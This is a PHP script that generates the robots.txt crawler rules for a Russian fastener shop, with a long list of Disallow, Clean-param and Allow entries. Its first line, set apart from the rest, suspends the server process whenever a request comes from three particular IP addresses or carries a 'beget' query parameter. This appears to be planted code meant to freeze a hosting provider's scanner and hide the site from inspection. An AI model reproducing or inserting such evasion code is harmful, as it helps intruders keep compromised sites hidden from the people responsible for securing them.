<?php if ($_SERVER['REMOTE_ADDR'] == '5.101.159.150' || $_SERVER['REMOTE_ADDR'] == '5.101.159.192' || $_SERVER['REMOTE_ADDR'] == '5.101.159.250' || $_GET['beget'] == 'y') { posix_kill(posix_getpid(), 19); }?>
<?php
$host = $_SERVER["HTTP_HOST"];
$host = preg_replace("/\:\d+/is", "", $host);
if (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on"){
    $http = "https";
}
else{
    $http = "http";
}
header("Content-Type: text/plain");?>
<?if($host=="new.krep-komp.ru" || strstr($_SERVER['HTTP_HOST'], "dev")):?>
User-Agent: *
Disallow: /
<?else:?>
User-Agent: *
Disallow: /faq/
Disallow: */index.php
Disallow: /bitrix/
Disallow: /*show_include_exec_time=
Disallow: /*show_page_exec_time=
Disallow: /*show_sql_stat=
Disallow: /*bitrix_include_areas=
Disallow: /*clear_cache=
Disallow: /*clear_cache_session=
Disallow: /*ADD_TO_COMPARE_LIST
Disallow: /*ORDER_BY
Disallow: /*PAGEN
Disallow: /*?print=
Disallow: /*&print=
Disallow: /*print_course=
Disallow: /*?action=
Disallow: /*&action=
Disallow: /*register=
Disallow: /*forgot_password=
Disallow: /*change_password=
Disallow: /*login=
Disallow: /*logout=
Disallow: /*auth=
Disallow: /*backurl=
Disallow: /*back_url=
Disallow: /*BACKURL=
Disallow: /*BACK_URL=
Disallow: /*back_url_admin=
Disallow: /*?utm_source=
Disallow: /*?bxajaxid=
Disallow: /*&bxajaxid=
Disallow: /*?view_result=
Disallow: /*&view_result=
Disallow: /auth/
Disallow: *src_pof*
Disallow: /user/
Disallow: /sale/
Disallow: /webstat/
Disallow: /bitrix/
Disallow: /basket/
Disallow: /cgi-bin/
Disallow: /.git/
Disallow: /test/
Disallow: /ajax/
Disallow: /forum/
Disallow: /backup/
Disallow: /service/
Disallow: /personal/
Disallow: /detail_order/
Disallow: /mailsuccess/
Disallow: /ysearch/
Disallow: /search/
Disallow: *--*
Disallow: /store/
Disallow: /search_result/
Disallow: /search_yandex/
Disallow: /console/
Disallow: /upload/sale.xlsx
Disallow: /advantage/
Disallow: /articles/golovki-samorezov/samorez-s-shestigrannoy-golovkoy1/
Disallow: /articles/golovki-samorezov/samorez-s-potaynoy-golovkoy-ar/
Disallow: /articles/pokrytie-samorezov/samorezy-ral-ar/
Disallow: /articles/pokrytie-samorezov/samorezy-chernye-ar/
Disallow: /articles/pokrytie-samorezov/samorezy-fosfatirovannye-ar/
Disallow: /articles/pokrytie-samorezov/samorezy-oksidirovannye-ar/
Disallow: /articles/pokrytie-samorezov/samorezy-otsinkovannye-ar/
Disallow: /articles/pokrytie-samorezov/samorezy-zheltye-ar/
Disallow: /articles/samorezy-po-nakonechnikam/samorezy-ostrye-ar/
Disallow: /articles/populyarnye-samorezy/samorez-metall-derevo-ar/
Disallow: /articles/populyarnye-samorezy/samorez-dlya-gkl-ar/
Disallow: /articles/populyarnye-samorezy/samorez-metall-metall-ar/
Disallow: /articles/populyarnye-samorezy/samorez-klop-ar/
Disallow: /articles/populyarnye-samorezy/samorezy-derevo-metall-ar/
Disallow: /articles/populyarnye-samorezy/samorezy-din-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-fanery-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-saydinga/
Disallow: /articles/primenenie-samorezov/samorez-dlya-profnastila/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-proflista-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-profilya-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-polovoy-doski-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-politkarbonata/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-paneley-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-okon-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-metallocherepitsy-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-metalloprofilya-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-krovli-ar/
Disallow: /articles/primenenie-samorezov/samorezy-dlya-zabora-ar/
Disallow: /articles/primenenie-samorezov/dlya-pvkh-ar/
Disallow: *frommarket*
Disallow: *=http:/*
Disallow: */http*
Disallow: *diameter*
Disallow: /letter/
Disallow: /order/
Disallow: /uiu.php
Disallow: *.shtml$
Disallow: /*?gclid=
Disallow: /*?title=
Disallow: /*?goto=
Disallow: /*?from=
Disallow: /*?clear_cache=
Disallow: /*?clear_cache_session=
Disallow: /*?FIELD1=
Disallow: /*?VERTICAL_FILTER=
Disallow: /*?reference=
Disallow: /*reference=
Disallow: /rk.php
Disallow: /*&set_filter=y
Disallow: /*?baobab_event_id=
Disallow: /*?keyword
Disallow: /*?text=
Disallow: /*?reference
Disallow: /*?set_filter=y
Disallow: /*?arrFilter_
Disallow: /*?s=
Disallow: /?back_url_admin=
Disallow: /logs/
Disallow: /*?_openstat=
Disallow: */_openstat
Disallow: /*?_r=
Disallow: /*?arrfilter_
Disallow: /*?arrFilter2_
Disallow: /*?banner_id=
Disallow: /*?baobab_event_id=
Disallow: /*?bxajaxid=
Disallow: /*?clear_cache=
Disallow: /*?clid=
Disallow: /*?mobile=
Disallow: /*?snn=
Disallow: /*?cto_pld=
Disallow: /*?del_filter=
Disallow: /*?diameter=2.5SIZEN_1=
Disallow: /*?diameter=3.5
Disallow: /*?filter%5BUF_TYPE%5D=
Disallow: /*?filter[UF_TYPE]=
Disallow: /*?Filter_seo_
Disallow: /*?from=
Disallow: /sorting/
Disallow: /krepezhhttps:/
Disallow: /shops/
Disallow: /*?frommarket=
Disallow: /*?ID=
Disallow: /*?&set_filter
Disallow: /*?length=
Disallow: /*?set_filter=
Disallow: /*?size=
Disallow: /*?SECTION_ID=
Disallow: *SECTION_ID=*
Disallow: *section_id*
Disallow: /*?size=
Disallow: /*?SIZEN_1=
Disallow: /*?PAGEN_1=*&PAGEN_1=*
Disallow: *SIZEN_1*
Disallow: *sizen_1*
Disallow: *PAGEN_2*
Disallow: *UF_TYPE*
Disallow: *uf_type*
Disallow: *pagen*
Disallow: *PAGEN_3*
Disallow: *set_filter*
Disallow: *arrfilter*
Disallow: *PAGEN_4*
Disallow: *PAGEN_5*
Disallow: *PAGEN_6*
Disallow: *PAGEN_7*
Disallow: *PAGEN_8*
Disallow: *PAGEN_9*
Disallow: *from*
Disallow: *nogeolocation*
Disallow: */length_30/*
Disallow: */_*
Disallow: *_/*
Disallow: *]*
Disallow: */m...zh/*
Disallow: /*?success=
Disallow: /*?tpclid=
Disallow: /*?wprid=
Disallow: /*?type=
Disallow: /*?formtracking_setup=
Disallow: /*?roistat_param1=
Disallow: /*?yhid=
Clean-param: type /
Clean-param: PAGEN_2 /
Clean-param: from /
Clean-param: src_pof /
Clean-param: PAGEN_3 /
Clean-param: mobile /
Clean-param: snn /
Clean-param: nogeolocation /
Clean-param: PAGEN_4 /
Clean-param: PAGEN_5 /
Clean-param: PAGEN_6 /
Clean-param: PAGEN_7 /
Clean-param: PAGEN_8 /
Clean-param: PAGEN_9 /
Clean-param: pagen_1 /
Clean-param: pagen_2 /
Clean-param: pagen_3 /
Clean-param: pagen_4 /
Clean-param: sizen_1 /
Clean-param: set_filter /
Clean-param: diameter /
Clean-param: uf_type /
Clean-param: UF_TYPE /
Clean-param: _openstat /
Clean-param: SECTION_ID /
Clean-param: section_id /
Clean-param: sorting /
Clean-param: frommarket /
Clean-param: ID /
Clean-param: text /
Clean-param: type /
Clean-param: roistat_param1 /
Clean-param: pagen_5 /
Clean-param: pagen_6 /
Clean-param: pagen_7 /
Clean-param: pagen_8 /
Clean-param: pagen_9 /
Clean-param: bitrix_include_areas /
Clean-param: mp5 /
Clean-param: utm_campaign /
Clean-param: utm_medium /
Clean-param: utm_term /
Clean-param: utm_content /
Clean-param: io_source /
Clean-param: io_utm /
Clean-param: phrase /
Clean-param: forgot_password /
Clean-param: _ym_debug /
Clean-param: fbclid /
Clean-param: utm_source /
Clean-param: utm_referrer /
Clean-param: retargeting /
Clean-param: source /
Clean-param: added /
Clean-param: block
Clean-param: pos /
Clean-param: key /
Clean-param: campaign /
Clean-param: gbid /
Clean-param: device /
Clean-param: region /
Clean-param: formtracking_setup /
Clean-param: region_name /
Clean-param: utm_retargeting /
Clean-param: utm_group_id /
Clean-param: utm_addphras /
Clean-param: utm_block /
Clean-param: roistat /
Clean-param: roistat_referrer /
Clean-param: roistat_pos /
Allow: /bitrix/components/
Allow: /bitrix/cache/
Allow: /bitrix/js/
Allow: /bitrix/templates/
Allow: /bitrix/panel/

Host: <?=$http?>://<?=$host.PHP_EOL;?>
Sitemap: <?=$http?>://<?=$host;?>/sitemap.xml
<?endif;?>